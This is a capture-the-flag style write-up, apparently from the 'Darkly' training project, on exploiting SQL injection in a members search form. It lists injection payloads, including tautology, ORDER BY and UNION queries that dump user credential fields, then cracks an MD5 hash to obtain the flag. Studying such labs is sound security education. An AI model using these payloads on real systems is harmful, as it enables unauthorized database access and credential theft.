# 🧑‍🤝‍🧑 SQL Injection – Members Search – MEMO

## 📌 Breach Summary
The members search functionality in the Darkly application is vulnerable to **SQL Injection**. User input in the search field is directly used in SQL queries without sanitization, allowing attackers to manipulate the query and access or modify database content.

---

## ✅ Step-by-Step Exploitation

### 1. 🔍 Locate the Members Search Page
Navigate to:
```text
http://<target-ip>/index.php?page=member
```
You’ll see a form to search for registered members by name or ID.

### 2. 💉 Test for SQL Injection
In the search field, input:
```sql
'
```
If a SQL syntax error appears, the field is injectable.

### 3. 🛠️ Exploit the Injection
To dump data or bypass filters, use:
```sql
' OR '1'='1
```
or
```sql
' UNION SELECT 1,2,3,4--
```

Try finding the number of columns:
```sql
' ORDER BY 4--
```

You can also try:
```sql
' UNION SELECT null, username, password, null FROM users--
```

### 4. ✅ Retrieve the Flag
- Finally try this one:
```sql
1 AND 1=2 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
```
Get the last one (5th)

use the site https://md5decrypt.net/en/ to decript the key.
We'll get "FortyTwo" as a result of the decription.
We lower the letter of the string to 'fortytwo'.
Then we use sha256 tools (e.g. https://emn178.github.io/online-tools/sha256.html) to find the flag.
---

## 💬 What to Say During Evaluation

- Explain that SQL Injection happens when user input is not sanitized before query execution.
- Discuss common payloads and how you used them to manipulate query logic.
- Show the result, explain your steps, and highlight the vulnerable code behavior.

---

## 📚 References

- OWASP A1: Injection
- SQL Injection Cheatsheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- Tools used: browser, manual payload injection

✅ Be ready to reproduce each step live and explain the mechanics of the SQL injection.